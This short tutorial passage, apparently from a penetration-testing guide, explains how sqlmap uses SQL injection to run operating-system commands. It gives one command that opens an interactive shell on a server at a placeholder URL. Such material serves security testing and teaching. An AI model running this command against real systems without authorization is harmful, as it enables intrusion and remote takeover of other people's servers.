    ```


    # Executing Commands in the Operating System


    SQLmap can be used to execute commands on the target server''s operating system
    through SQL injection. Use the option --os-shell to open an interactive shell:


    bash


    ```

    sqlmap -u "http://example.com/vulnerable.php?id=1" --os-shell

    ```


